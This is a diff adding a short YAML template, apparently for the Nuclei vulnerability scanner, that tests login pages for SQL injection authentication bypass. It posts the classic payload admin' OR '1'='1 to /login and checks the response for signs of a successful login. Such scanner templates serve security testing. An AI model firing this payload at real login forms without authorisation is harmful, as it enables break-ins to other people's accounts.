@@ -1,0 +1,17 @@
+id: K70n0s510-sqli-auth
+info:
+  name: SQLi Auth Bypass (Universal)
+  author: K70n0s510
+  severity: critical
+  tags: sqli,auth-bypass
+http:
+  - method: POST
+    path: ["{{BaseURL}}/login"]
+    body: "username=admin' OR '1'='1&password=password"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["Welcome", "Dashboard", "Logout"]
+      - type: word
+        words: ["Invalid password"]
+        negative: true
